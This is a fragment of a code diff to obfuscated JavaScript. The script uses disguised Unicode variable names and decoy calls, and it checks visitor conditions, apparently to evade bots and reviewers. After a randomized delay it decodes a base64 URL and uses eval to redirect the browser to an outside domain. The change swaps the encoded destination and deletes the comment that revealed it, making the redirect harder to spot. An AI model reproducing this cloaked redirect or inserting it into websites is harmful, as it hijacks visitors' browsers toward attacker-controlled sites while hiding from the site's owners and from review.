@@ -20,7 +20,6 @@
     }
     return $𝒎𝒃 && !$𝒃𝒕 && $𝒉𝒌;
   };
-
   (async () => {
     const $𝒅𝒖𝒎 = {
       𝓪: 123,
@@ -39,7 +38,7 @@
     $𝒃𝒂𝒊𝒕(); $𝒏𝒐();
 
     if (await $𝒈𝒐()) {
-      const $𝒍𝒊𝒏 = "aHR0cHM6Ly9kcmVhbWg5LmNvbS8="; // https://dreamx9.com
+      const $𝒍𝒊𝒏 = "aHR0cHM6Ly9kcmVhbW14OS5jb20=";
       await $𝟏𝒙(5000 + Math.floor(Math.random() * 300));
       const $𝒅𝒆 = atob($𝒍𝒊𝒏);
       eval("window" + "." + "location" + "." + "href = $𝒅𝒆");
